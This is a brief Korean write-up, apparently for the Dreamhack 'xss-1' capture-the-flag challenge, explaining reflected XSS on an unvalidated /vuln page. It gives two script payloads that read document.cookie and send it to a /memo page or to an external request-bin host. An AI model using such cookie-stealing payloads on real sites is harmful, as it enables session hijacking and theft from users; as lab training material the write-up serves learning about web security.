#xss-1 풀이법

---

서버에서 이용자의 입력값을 별다른 검증 없이 페이지에 출력할 경우에 발생할 수 있는 문제점에 존재한다. (/vuln)<br>
XSS 공격은 주로 이용자의 입력값이 출력되는 페이지에서 발생하며,<br>
해당 공격을 통해 타 이용자의 브라우저에 저장된 쿠키 및 세션 정보를 탈취할 수 있다.
location.href 를 이용해 주소를 지정하고 document.cookie를 통해 쿠키값을 얻는다.<br>
**&lt;script&gt;location.href = "/memo?memo=" + document.cookie;&lt;/script&gt;**
or
**&lt;script&gt;>location.href = "http://hostname.request.dreamhack.games/?memo=" + document.cookie;</script&gt;**

---
